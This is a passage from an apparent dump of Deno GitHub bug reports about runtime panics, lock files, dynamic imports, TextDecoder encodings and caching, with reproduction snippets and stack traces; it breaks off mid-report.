@piscisaureus "},{"labels":["bug",null,null],"text":"Given a `.js` file on a Windows UNC/network path, I can write:\r\n```\r\ndeno run \\\\my\\unc\\path\\main.js // works\r\n```\r\nHowever, the same program with `.ts` extension (`main.ts`) seems to trigger a Rust error:\r\n```\r\ndeno run \\\\my\\unc\\path\\main.ts // error below\r\n```\r\nError:\r\n> thread 'main' panicked at 'internal error: entered unreachable code', cli\\disk_cache.rs:83:20\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n\r\nstack backtrace with `RUST_BACKTRACE=full`:\r\n```\r\n   0:     0x7ff78b84e4df - CrashForExceptionInNonABICompliantCodeRange\r\n   1:     0x7ff78b86fa2b - CrashForExceptionInNonABICompliantCodeRange\r\n   2:     0x7ff78b84429c - CrashForExceptionInNonABICompliantCodeRange\r\n   3:     0x7ff78b851b6c - CrashForExceptionInNonABICompliantCodeRange\r\n   4:     0x7ff78b8517bf - CrashForExceptionInNonABICompliantCodeRange\r\n   5:     0x7ff78b852347 - CrashForExceptionInNonABICompliantCodeRange\r\n   6:     0x7ff78a58a14d - <unknown>\r\n   7:     0x7ff78a681a0a - <unknown>\r\n   8:     0x7ff78a57267a - <unknown>\r\n   9:     0x7ff78a5ff00c - <unknown>\r\n  10:     0x7ff78a583435 - <unknown>\r\n  11:     0x7ff78a5d7d81 - <unknown>\r\n  12:     0x7ff78a57f6ca - <unknown>\r\n  13:     0x7ff78a5d4075 - <unknown>\r\n  14:     0x7ff78a5e44d8 - <unknown>\r\n  15:     0x7ff78a48cbbe - <unknown>\r\n  16:     0x7ff78a522b49 - <unknown>\r\n  17:     0x7ff78a4dd684 - <unknown>\r\n  18:     0x7ff78a65cbe5 - <unknown>\r\n  19:     0x7ff78a500b50 - <unknown>\r\n  20:     0x7ff78a71ea16 - <unknown>\r\n  21:     0x7ff78b851d67 - CrashForExceptionInNonABICompliantCodeRange\r\n  22:     0x7ff78b85fd92 - CrashForExceptionInNonABICompliantCodeRange\r\n  23:     0x7ff78b852588 - CrashForExceptionInNonABICompliantCodeRange\r\n  24:     0x7ff78a5049d7 - <unknown>\r\n  25:     0x7ff78b880144 - CrashForExceptionInNonABICompliantCodeRange\r\n  26:     0x7ffe08de7bd4 - BaseThreadInitThunk\r\n  27:     0x7ffe0a3ace51 - RtlUserThreadStart\r\n```\r\n```\r\ndeno --version\r\ndeno 1.0.5\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"`let a = await fetch('https://pictures.vwe.nl');\r\nconsole.log(a)`\r\n\r\nReturns \"Error trying to connect: Connection reset by peer (os error 54)\"\r\n\r\n`deno --version`\r\n- deno 1.0.5\r\n- v8 8.4.300\r\n- typescript 3.9.2"},{"labels":["bug",null],"text":"My understanding is that dynamic imports should be able to be added to lock files.  However, this does not seem to work (or I am doing it incorrectly).  Example:\r\n\r\n**mod.ts**\r\n```\r\nconst child = (await import('https://deno.land/std@v0.50.0/testing/asserts.ts'));\r\nconsole.log(child);\r\n```\r\nWhen running:\r\n```\r\ndeno run --allow-net --lock=lock.json --lock-write mod.ts\r\n```\r\nI get the following lock.json produced:\r\n```\r\n{}\r\n```\r\nI've also tried `deno cache --reload --lock=lock.json --lock-write mod.ts` and end up with the same result.  Other things I've tried include adding another normal import (which gets properly cached and locked) and removing the `child` assignment, but the dynamic import still refuses show up in the lock file."},{"labels":["bug",null],"text":"https://github.com/denoland/deno/runs/750715681\r\nhttps://github.com/denoland/deno/runs/750728483"},{"labels":["bug",null],"text":"When sending an UDP in a for-loop, Rust panics and the app crashes\r\n\r\n```typescript\r\nfor(const buffer of buffers){\r\n    listener.send(buffer, ...);\r\n}\r\n```\r\n\r\n    thread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/4fb7144ed159f94491249e86d5bbd033b5d60550\\src\\libcore\\cell.rs:878:9\r\n\r\n    note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace`\r\n\r\nSending an UDP in a for-loop, but awaiting, works\r\n\r\n```typescript\r\nfor(const buffer of buffers){\r\n    await listener.send(buffer, ...);\r\n}\r\n```"},{"labels":["bug",null],"text":"Receiving TS2531 [ERROR] when running the mjs/cjs after Deno 1.0.4.\r\n\r\nsave as \"test.mjs\"\r\n```\r\nimport { exp } from \"./test_mod.ts\";\r\nif (false) null.func();\r\n```\r\nsave as \"test_mod.ts\"\r\n```\r\nexport const exp = {};\r\n```\r\nand run\r\n```\r\n% deno run test.mjs\r\nCompile file:/// ... /test.mjs\r\nerror: TS2531 [ERROR]: Object is possibly 'null'.\r\nif (false) null.func();\r\n           ~~~~\r\n    at file:/// ... /test.mjs:2:12\r\n```\r\n\r\n1.0.5 -- NG\r\n1.0.4 -- NG\r\n1.0.3 -- OK\r\n\r\nwithout ts import -- OK\r\nimport mjs -- OK"},{"labels":["bug",null],"text":"```typescript\r\nimport {readFileStr} from \"https://deno.land/std@0.56.0/fs/read_file_str.ts\";\r\n\r\nconsole.log(\"start\");\r\nreadFileStr(\"/dev/urandom\").then(e=>console.log(\"done!\"));\r\nconsole.log(\"end\");\r\n```\r\n\r\nRunning:\r\n\r\n```\r\n$ deno run --allow-read main.ts\r\nstart\r\nend\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', core/bindings.rs:744:5\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\nfatal runtime error: failed to initiate panic, error 5\r\nAborted (core dumped)\r\n```\r\n\r\nOn Unix systems, files like `/dev/urandom` and `/dev/zero` are pseudo devices, which behave differently then normal files. Is this intended behaviour? Should the user be expected to check for these kinds of files beforehand?"},{"labels":["bug",null],"text":"```\r\n> deno\r\nDeno 1.0.5\r\nexit using ctrl+d or close()\r\n> typeof WebAssembly.instantiate\r\nfunction\r\n> typeof WebAssembly.instantiateStreaming\r\nundefined\r\n```\r\n\r\nhttps://github.com/denoland/deno/blob/8b037364ac269b7887f3420fefb38be8d0693e9e/cli/js/lib.deno.shared_globals.d.ts#L48"},{"labels":["bug",null],"text":"## Summary\r\n\r\nThe behavior of dynamic imports with the `--reload` flag seems to have changed between v1.0.2 and later.\r\n\r\n## Steps to reproduce\r\n\r\nI have a file called `sample.ts`:\r\n\r\n```typescript\r\nawait import(\"https://deno.land/x/sqlite@v2.1.0/mod.ts\");\r\nconsole.log(\"1\");\r\nawait import(\"https://deno.land/x/sqlite@v2.1.0/mod.ts\");\r\nconsole.log(\"2\");\r\n```\r\n\r\nWhen running it with `-r` flag, deno compiles the `https://deno.land/x/sqlite@v2.1.0/mod.ts` multiple times:\r\n\r\n```shell\r\n$ deno run --allow-net -r ./sample.ts\r\nCompile file:///home/uki00a/projects/test/sample.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/mod.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/db.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/rows.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/constants.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/build/sqlite.js\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/wasm.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/error.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/build/vfs.js\r\nCompile https://deno.land/x/sqlite@v2.1.0/mod.ts\r\n1\r\nCompile https://deno.land/x/sqlite@v2.1.0/mod.ts\r\n2\r\n```\r\n\r\nWhen running it on deno@v1.0.2, the compilation happens only once:\r\n\r\n```shell\r\n$ deno run --allow-net -r ./sample.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/mod.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/db.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/rows.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/constants.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/wasm.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/src/error.ts\r\nDownload https://deno.land/x/sqlite@v2.1.0/build/sqlite.js\r\nDownload https://deno.land/x/sqlite@v2.1.0/build/vfs.js\r\nCompile file:///home/uki00a/projects/test/sample.ts\r\n1\r\n2\r\n```"},{"labels":["bug",null],"text":"Let's see if this is just me or it's some bug.\r\n\r\nI'm using Ramda and trying to play around with Deno with it.\r\n\r\nSo far I was importing it using [pika.dev](https://www.pika.dev/npm/ramda) like:\r\n```js\r\n// myscript.js\r\nimport * as R from \"https://cdn.pika.dev/ramda@^0.27.0\";\r\nconsole.log(R);\r\n```\r\nMake sure you're using version 1.0.0:\r\n```sh\r\ndeno upgrade --version 1.0.0\r\n```\r\nThen run it:\r\n```sh\r\ndeno run --allow-net --reload myscript.js\r\n```\r\nWorks fine and all modules are logged to console.\r\n\r\nThen:\r\n```sh\r\ndeno upgrade --version 1.0.5\r\ndeno run --allow-net --reload myscript.js\r\n```\r\nNow there's error message:\r\n```sh\r\nerror: relative import path \"Iteration/Iteration\" not prefixed with / or ./ or ../ Imported from \"https://cdn.pika.dev/-/ts-toolbelt@v6.9.4-4dgRR6t63EUp6VbVv2Im/dist=es2019,mode=types/out/index.d.ts\"\r\n```\r\n\r\nCan someone confirm? Maybe it's also related to other libraries loaded from third parties.\r\n"},{"labels":["bug",null,null],"text":"This minimal example\r\n```typescript\r\nconst data = new Uint8Array(32);\r\nconst nread = Deno.stdin.readSync(data);\r\n\r\nconsole.log(\"read %d bytes\", nread);\r\n```\r\n\r\nResults in the following error consistently across Ubuntu, MacOS and Windows:\r\n\r\n```shell\r\nCompile file:///Users/caspervonb/deno-sync-read-not-allowed-on-stdin/test.ts\r\nerror: Uncaught TypeError: sync read not allowed on this resource  \r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at Object.sendSyncMinimal ($deno$/ops/dispatch_minimal.ts:118:10)\r\n    at Object.readSync ($deno$/ops/io.ts:19:17)\r\n    at Stdin.readSync ($deno$/files.ts:110:12)\r\n    at file:///Users/caspervonb/deno-sync-read-not-allowed-on-stdin/test.ts:4:26\r\n```"},{"labels":["bug",null],"text":"WebAssembly errors are getting caught up in the source-map/caching mechanism.\r\n\r\nFor example\r\n\r\n```typescript\r\n// WebAssembly module containing a single function with an unreachable instruction\r\nconst binary = Uint8Array.of(\r\n\t0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x60,\r\n\t0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x0f, 0x01, 0x0b, 0x75, 0x6e,\r\n\t0x72, 0x65, 0x61, 0x63, 0x68, 0x61, 0x62, 0x6c, 0x65, 0x00, 0x00, 0x0a,\r\n\t0x05, 0x01, 0x03, 0x00, 0x00, 0x0b\r\n);\r\n\r\nconst module = new WebAssembly.Module(binary);\r\nconst instance = new WebAssembly.Instance(module);\r\n\r\ninstance.exports.unreachable();\r\n```\r\n\r\nActual output:\r\n\r\n```\r\nthread 'main' panicked at 'not implemented: Don't know how to create cache name for scheme: wasm', cli/disk_cache.rs:95:9\r\n```\r\n\r\nExpected output:\r\n\r\n```\r\nRuntimeError: unreachable\r\n    at wasm-function[0]:0x28\r\n    at Object.<anonymous> (/Users/caspervonb/wasm_error_test.ts:13:18)\r\n    at Module._compile (internal/modules/cjs/loader.js:1176:30)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1196:10)\r\n    at Module.load (internal/modules/cjs/loader.js:1040:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:929:14)\r\n    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:71:12)\r\n    at internal/main/run_main_module.js:17:47\r\n```\r\n\r\nTraceback:\r\n\r\n```\r\n   0:        0x10adfe1ec - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::h1216a26f3ce3c114\r\n   1:        0x10ae1cbae - core::fmt::write::ha0ec7ad9e1aa7104\r\n   2:        0x10adfd929 - std::io::Write::write_fmt::he79f4e513ba146b5\r\n   3:        0x10adef49a - std::panicking::default_hook::{{closure}}::hdf6a192f990c9642\r\n   4:        0x10adef1a5 - std::panicking::default_hook::hc1d0cb86aebc9fbd\r\n   5:        0x10adefb08 - std::panicking::rust_panic_with_hook::hbe9b3056eff949a6\r\n   6:        0x10adef6d2 - rust_begin_unwind\r\n   7:        0x10ae4298b - std::panicking::begin_panic_fmt::hb770b3908b606330\r\n   8:        0x109bc117e - deno::disk_cache::DiskCache::get_cache_filename_with_extension::h9bead961694c7bab\r\n   9:        0x109b0080f - deno::tsc::TsCompiler::get_source_map_file::he10d1f955e964df3\r\n  10:        0x109b00db8 - <deno::tsc::TsCompiler as deno::source_maps::SourceMapGetter>::get_source_map::h9a57a5b6593e518a\r\n  11:        0x1099f068b - deno::source_maps::get_orig_position::h0fcac86f7ca8ea7d\r\n  12:        0x1099efe1c - deno::source_maps::apply_source_map::ha23dbe5088bcb2f3\r\n  13:        0x109b3520c - deno::worker::Worker::new::{{closure}}::h1031ac6f522a4c0e\r\n  14:        0x10a237a47 - deno_core::isolate::exception_to_err_result::he185b15303110714\r\n  15:        0x10a2303bc - deno_core::es_isolate::EsIsolate::mod_evaluate::ha4e54ab131b37f04\r\n  16:        0x109a9df52 - <std::future::GenFuture<T> as core::future::future::Future>::poll::hef4c9d64af759bf3\r\n  17:        0x109a72fbe - <std::future::GenFuture<T> as core::future::future::Future>::poll::h13505288ce1a253d\r\n  18:        0x109a2d958 - std::thread::local::LocalKey<T>::with::hdd75ccf8bc47ed44\r\n  19:        0x109bba4fe - tokio::macros::scoped_tls::ScopedKey<T>::set::h9b3141d2c27c8389\r\n  20:        0x109c50af1 - tokio::runtime::basic_scheduler::BasicScheduler<P>::block_on::ha0be0ef39a82a650\r\n  21:        0x109bbd332 - tokio::runtime::context::enter::h0ff9f498deb68362\r\n  22:        0x109a1ea46 - deno::tokio_util::run_basic::h3538e974f25d293c\r\n  23:        0x109b04a11 - deno::main::h5f6baf7a364ebade\r\n  24:        0x109c1ee46 - std::rt::lang_start::{{closure}}::h9ec716e45ba52b55\r\n  25:        0x10adef5d8 - std::panicking::try::do_call::h69374c200cb9b71d\r\n  26:        0x10ae060cb - __rust_maybe_catch_panic\r\n  27:        0x10adea733 - std::rt::lang_start_internal::h892855ab5abc97d0\r\n  28:        0x109b08509 - main```"},{"labels":["bug",null],"text":"## Steps to reproduce\r\n1. Create a file `script.ts` with the content `console.log('hello')`.\r\n2. Create another file `entry.ts` with the following content:\r\n```ts\r\nwhile(true) {\r\n  const worker = new Worker('./script.ts', {type: 'module'})\r\n  await new Promise(resolve => setTimeout(resolve, 1000))\r\n  worker.terminate()\r\n}\r\n```\r\n3. Run this command: `deno run --allow-read main.ts`.\r\n4. Modify the content of `script.ts` to `console.log('bye')` and save it.\r\n\r\n## Expected result\r\nThe subsequent log of `deno run --allow-read main.ts` should be `bye`.\r\n\r\n## Actual result\r\nAfter step 4, the subsequent log of  `deno run --allow-read main.ts` is still `hello`.\r\n\r\n## Environment:\r\n```\r\nmacOS Catalina (v10.15.4)\r\n```\r\n```\r\n$ deno --version\r\ndeno 1.0.5\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```\r\n\r\n## Is this introduced lately?\r\nNo, this is happening on every version of Deno since `v1.0.0` until `v1.0.5`.\r\n\r\n## Current workaround\r\nRefer https://stackoverflow.com/a/41790024/6587634"},{"labels":["bug",null],"text":"Receiving this error when importing a file. It looks like the issue is isolated to Linux\r\n\r\n```\r\nerror: Uncaught AssertionError: Unexpected skip of the emit.\r\n    at Object.assert ($deno$/util.ts:33:11)\r\n    at compile ($deno$/compiler.ts:1170:7)\r\n    at tsCompilerOnMessage ($deno$/compiler.ts:1338:22)\r\n    at workerMessageRecvCallback ($deno$/runtime_worker.ts:72:33)\r\n    at file:///mydir/__anonymous__:1:1\r\n```\r\n\r\nCode to reproduce this error on Linux:\r\n\r\n```javascript\r\nimport Dex from \"https://deno.land/x/dex/mod.ts\";\r\n```\r\n\r\nWill look into it further and see if I can isolate the bug a bit."},{"labels":["bug",null],"text":"Starting with `deno` v1.0.3, a new `.graph` file seems to be output into the `gen` files in the deno cache alongside the other compiled files. For example:\r\n\r\n```\r\n └── api\r\n      ├── hello.ts.graph\r\n      ├── hello.ts.js\r\n      ├── hello.ts.js.map\r\n      └── hello.ts.meta\r\n```\r\n\r\nI am deploying to a Lambda function which has a read-only filesystem where the deno cache resides (same setup as in #5688). For some reason, when executing `deno run hello.ts` from within the Lambda, `deno` decides to compile the `hello.ts` file again causing the command to fail:\r\n\r\n```\r\nCompile file:///var/task/hello.ts\r\nerror: Read-only file system (os error 30) (for '\"/var/task/.deno/gen/file/var/task/hello.ts.graph\"')\r\n```\r\n\r\nI'm not sure why this is happening (why `deno` considers that it needs to be compiled again), but it could be due to the fact that the `.graph` file contains absolute file paths, and the directory where the `deno cache` command is run is a different directory path than the where `deno run` command is run (the deno cache directory gets moved from a temp dir to `/var/task` in the runtime). So I'm thinking the (mismatching) absolute paths could be the culprit… Would re-writing those file paths to the correct destination directory prevent `deno` from trying to re-compile the TS file?\r\n\r\nOr alternatively, is there a way to tell `deno` to never compile in the `deno run` command?\r\n\r\nAlso, out of curiosity, what is this new `.graph` file? I can't seem to find any mention of it in the release notes for v1.0.3."},{"labels":["bug",null],"text":"so i went to https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder/encoding and made this \r\nscript\r\n\r\n```ts\r\nconst arr = [\r\n  \"ascii\",\r\n  \"latin1\",\r\n  \"utf8\",\r\n  \"ibm866\",\r\n  \"iso-8859-2\",\r\n  \"iso-8859-3\",\r\n  \"iso-8859-4\",\r\n  \"iso-8859-5\",\r\n  \"iso-8859-6\",\r\n  \"iso-8859-7\",\r\n  \"iso-8859-8\",\r\n  \"iso-8859-8i\",\r\n  \"iso-8859-10\",\r\n  \"iso-8859-13\",\r\n  \"iso-8859-14\",\r\n  \"iso-8859-15\",\r\n  \"iso-8859-16\",\r\n  \"koi8-r\",\r\n  \"koi8-u\",\r\n  \"macintosh\",\r\n  \"windows-874\",\r\n  \"windows-1250\",\r\n  \"windows-1251\",\r\n  \"windows-1252\",\r\n  \"windows-1253\",\r\n  \"windows-1254\",\r\n  \"windows-1255\",\r\n  \"windows-1256\",\r\n  \"windows-1257\",\r\n  \"windows-1258\",\r\n  \"x-mac-cyrillic\",\r\n  \"gbk\",\r\n  \"gb18030\",\r\n  \"hz-gb-2312\",\r\n  \"big5\",\r\n  \"euc-jp\",\r\n  \"iso-2022-jp\",\r\n  \"shift-jis\",\r\n  \"euc-kr\",\r\n  \"iso-2022-kr\",\r\n  \"utf-16be\",\r\n  \"utf-16le\",\r\n  \"x-user-defined\",\r\n];\r\n\r\nconst supported: string[] = [];\r\nconst notSupported: string[] = [];\r\n\r\narr.forEach((item) => {\r\n  try {\r\n    new TextDecoder(item);\r\n    supported.push(item);\r\n  } catch (error) {\r\n    notSupported.push(item);\r\n  }\r\n});\r\n\r\nconsole.log(\"\\nSupported:\");\r\nsupported.forEach((item) => console.log(`    ${item}`));\r\nconsole.log(\"\\nNot Supported:\");\r\nnotSupported.forEach((item) => console.log(`    ${item}`));\r\n\r\n```\r\n\r\nand the result is this\r\n\r\n```\r\nSupported:\r\n    ascii\r\n    latin1\r\n    utf8\r\n    windows-1252\r\n\r\nNot Supported:\r\n    ibm866\r\n    iso-8859-2\r\n    iso-8859-3\r\n    iso-8859-4\r\n    iso-8859-5\r\n    iso-8859-6\r\n    iso-8859-7\r\n    iso-8859-8\r\n    iso-8859-8i\r\n    iso-8859-10\r\n    iso-8859-13\r\n    iso-8859-14\r\n    iso-8859-15\r\n    iso-8859-16\r\n    koi8-r\r\n    koi8-u\r\n    macintosh\r\n    windows-874\r\n    windows-1250\r\n    windows-1251\r\n    windows-1253\r\n    windows-1254\r\n    windows-1255\r\n    windows-1256\r\n    windows-1257\r\n    windows-1258\r\n    x-mac-cyrillic\r\n    gbk\r\n    gb18030\r\n    hz-gb-2312\r\n    big5\r\n    euc-jp\r\n    iso-2022-jp\r\n    shift-jis\r\n    euc-kr\r\n    iso-2022-kr\r\n    utf-16be\r\n    utf-16le\r\n    x-user-defined\r\n```\r\n\r\n\r\n"},{"labels":["bug",null],"text":"I'm behind a corporate proxy and on tring to install script deno I get this error:\r\n```\r\nDownload https://deno.land/std/path/mod.ts\r\nerror: error sending request for url (https://deno.land/std/path/mod.ts): error trying to connect: received corrupt message\r\n```\r\nI'm on windows, HTTP_PROXY and HTTPS_PROXY env variables are set. \r\n"},{"labels":["bug",null],"text":"Running a simple oak server to illustrate [deno-react-example](https://github.com/o2sevruk/deno-react-example) using deno 1.0.3 on Ubuntu results in: \"error: No such file or directory (os error 2)\"\r\n\r\nWould anyone know how to debug this?\r\nThanks\r\n"},{"labels":["bug",null],"text":"Received this error. For some additional info, I am only using the `std/path` module and some function from the `Deno` global.\r\n\r\n```\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/4fb7144ed159f94491249e86d5bbd033b5d60550/src/libcore/cell.rs:878:9\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.44/src/backtrace/libunwind.rs:86\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.44/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print_fmt\r\n             at src/libstd/sys_common/backtrace.rs:78\r\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n             at src/libstd/sys_common/backtrace.rs:59\r\n   4: core::fmt::write\r\n             at src/libcore/fmt/mod.rs:1063\r\n   5: std::io::Write::write_fmt\r\n             at src/libstd/io/mod.rs:1426\r\n   6: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:62\r\n   7: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:49\r\n   8: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:204\r\n   9: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:224\r\n  10: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:470\r\n  11: rust_begin_unwind\r\n             at src/libstd/panicking.rs:378\r\n  12: core::panicking::panic_fmt\r\n             at src/libcore/panicking.rs:85\r\n  13: core::option::expect_none_failed\r\n             at src/libcore/option.rs:1211\r\n  14: deno_core::bindings::send\r\n  15: <extern \"C\" fn(A0) .> R as rusty_v8::support::CFnFrom<F>>::mapping::c_fn\r\n  16: _ZN2v88internal25FunctionCallbackArguments4CallENS0_15CallHandlerInfoE\r\n  17: _ZN2v88internal12_GLOBAL__N_119HandleApiCallHelperILb0EEENS0_11MaybeHandleINS0_6ObjectEEEPNS0_7IsolateENS0_6HandleINS0_10HeapObjectEEESA_NS8_INS0_20FunctionTemplateInfoEEENS8_IS4_EENS0_16BuiltinArgumentsE\r\n  18: _ZN2v88internalL26Builtin_Impl_HandleApiCallENS0_16BuiltinArgumentsEPNS0_7IsolateE\r\n  19: Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\nfatal runtime error: failed to initiate panic, error 5\r\nAborted\r\n```"},{"labels":["bug",null],"text":"```\r\nC:\\workspace>deno-1.0.3.exe\r\nDeno 1.0.3\r\nexit using ctrl+d or close()\r\n> crypto.getRandomValues(new Uint8Array(10))\r\nUint8Array(10) [\r\n  255, 146, 102,  81,\r\n  25, 238, 144, 127,\r\n  185, 250\r\n]\r\n> \r\n```\r\n\r\n```\r\nC:\\workspace\\deno>deno\r\nDeno 1.0.4\r\nexit using ctrl+d or close()\r\n> crypto.getRandomValues(new Uint8Array(10))\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/4fb7144ed159f94491249e86d5bbd033b5d60550\\src\\libcore\\cell.rs:878:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n\r\nC:\\workspace\\deno>\r\n```\r\n\r\n```\r\nC:\\workspace\\deno>set RUST_BACKTRACE=full& deno\r\nDeno 1.0.4\r\nexit using ctrl+d or close()\r\n> crypto.getRandomValues(new Uint8Array(10))\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/4fb7144ed159f94491249e86d5bbd033b5d60550\\src\\libcore\\cell.rs:878:9\r\nstack backtrace:\r\n   0:     0x7ff7eaab92df - CrashForExceptionInNonABICompliantCodeRange\r\n   1:     0x7ff7eaada82b - CrashForExceptionInNonABICompliantCodeRange\r\n   2:     0x7ff7eaaaf09c - CrashForExceptionInNonABICompliantCodeRange\r\n   3:     0x7ff7eaabc96c - CrashForExceptionInNonABICompliantCodeRange\r\n   4:     0x7ff7eaabc5bf - CrashForExceptionInNonABICompliantCodeRange\r\n   5:     0x7ff7eaabd147 - CrashForExceptionInNonABICompliantCodeRange\r\n   6:     0x7ff7eaabcccf - CrashForExceptionInNonABICompliantCodeRange\r\n   7:     0x7ff7eaad9130 - CrashForExceptionInNonABICompliantCodeRange\r\n   8:     0x7ff7eaad8f83 - CrashForExceptionInNonABICompliantCodeRange\r\n   9:     0x7ff7e9fdd070 - <unknown>\r\n  10:     0x7ff7e9fcf8ab - <unknown>\r\n  11:     0x7ff7ea4731bb - CrashForExceptionInNonABICompliantCodeRange\r\n  12:     0x7ff7ea4725f8 - CrashForExceptionInNonABICompliantCodeRange\r\n  13:     0x7ff7ea471b46 - CrashForExceptionInNonABICompliantCodeRange\r\n  14:     0x7ff7ea471767 - CrashForExceptionInNonABICompliantCodeRange\r\n  15:     0x7ff7ea2842fc - CrashForExceptionInNonABICompliantCodeRange\r\n  16:     0x7ff7ea216755 - CrashForExceptionInNonABICompliantCodeRange\r\n  17:     0x7ff7ea20ff1f - CrashForExceptionInNonABICompliantCodeRange\r\n  18:     0x7ff7ea216755 - CrashForExceptionInNonABICompliantCodeRange\r\n  19:     0x7ff7ea216755 - CrashForExceptionInNonABICompliantCodeRange\r\n  20:     0x7ff7ea21421e - CrashForExceptionInNonABICompliantCodeRange\r\n  21:     0x7ff7ea213e0c - CrashForExceptionInNonABICompliantCodeRange\r\n  22:     0x7ff7ea0d57a7 - <unknown>\r\n  23:     0x7ff7ea0d4b2a - <unknown>\r\n  24:     0x7ff7ea003be3 - <unknown>\r\n  25:     0x7ff7e9ffb6a1 - <unknown>\r\n  26:     0x7ff7e9fdde9d - <unknown>\r\n  27:     0x7ff7e9fcf71b - <unknown>\r\n  28:     0x7ff7ea4731bb - CrashForExceptionInNonABICompliantCodeRange\r\n  29:     0x7ff7ea4725f8 - CrashForExceptionInNonABICompliantCodeRange\r\n  30:     0x7ff7ea471b46 - CrashForExceptionInNonABICompliantCodeRange\r\n  31:     0x7ff7ea471767 - CrashForExceptionInNonABICompliantCodeRange\r\n  32:     0x7ff7ea2842fc - CrashForExceptionInNonABICompliantCodeRange\r\n  33:     0x7ff7ea216755 - CrashForExceptionInNonABICompliantCodeRange\r\n  34:     0x7ff7ea216755 - CrashForExceptionInNonABICompliantCodeRange\r\n  35:     0x7ff7ea245a51 - CrashForExceptionInNonABICompliantCodeRange\r\n  36:     0x7ff7ea2c930f - CrashForExceptionInNonABICompliantCodeRange\r\n  37:     0x7ff7ea237dad - CrashForExceptionInNonABICompliantCodeRange\r\n  38:     0x7ff7ea21410c - CrashForExceptionInNonABICompliantCodeRange\r\n  39:     0x7ff7ea0d56de - <unknown>\r\n  40:     0x7ff7ea0d5dac - <unknown>\r\n  41:     0x7ff7ea0d5eaf - <unknown>\r\n  42:     0x7ff7ea199b28 - CrashForExceptionInNonABICompliantCodeRange\r\n  43:     0x7ff7ea199905 - CrashForExceptionInNonABICompliantCodeRange\r\n  44:     0x7ff7ea035ae1 - <unknown>\r\n  45:     0x7ff7ea010321 - <unknown>\r\n  46:     0x7ff7e9ffb436 - <unknown>\r\n  47:     0x7ff7e9fb9380 - <unknown>\r\n  48:     0x7ff7e9fb7ce0 - <unknown>\r\n  49:     0x7ff7e9fc3179 - <unknown>\r\n  50:     0x7ff7e98121fa - <unknown>\r\n  51:     0x7ff7e96f250e - <unknown>\r\n  52:     0x7ff7e9787669 - <unknown>\r\n  53:     0x7ff7e9741a54 - <unknown>\r\n  54:     0x7ff7e98c16f5 - <unknown>\r\n  55:     0x7ff7e9764f20 - <unknown>\r\n  56:     0x7ff7e9948d26 - <unknown>\r\n  57:     0x7ff7eaabcb67 - CrashForExceptionInNonABICompliantCodeRange\r\n  58:     0x7ff7eaacab92 - CrashForExceptionInNonABICompliantCodeRange\r\n  59:     0x7ff7eaabd388 - CrashForExceptionInNonABICompliantCodeRange\r\n  60:     0x7ff7e9768da7 - <unknown>\r\n  61:     0x7ff7eaaeaf44 - CrashForExceptionInNonABICompliantCodeRange\r\n  62:     0x7ffd92e77bd4 - BaseThreadInitThunk\r\n  63:     0x7ffd9398ce51 - RtlUserThreadStart\r\n\r\nC:\\workspace\\deno>\r\n```"},{"labels":["bug",null],"text":"Hello 👋 \r\n\r\nfile `./deps.ts`\r\n```javascript\r\n// [1]\r\n\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nexport { default as React } from \"https://dev.jspm.io/react@16.12.0\";\r\n ```\r\n```javascript\r\n// [2]\r\n\r\n// @deno-types=\"https://deno.land/x/types/react/v16.13.1/react.d.ts\"\r\nimport React  from \"https://dev.jspm.io/react@16.12.0\";\r\nexport { React }\r\n ```\r\nfile ~~./app.ts~~ `./app.tsx`\r\n```javascript\r\nimport { React } from \"./deps.ts\"\r\nconst component = <h1>Deno</h1>\r\nconsole.log(\"It Works !\") \r\n ```\r\n[output] [1] 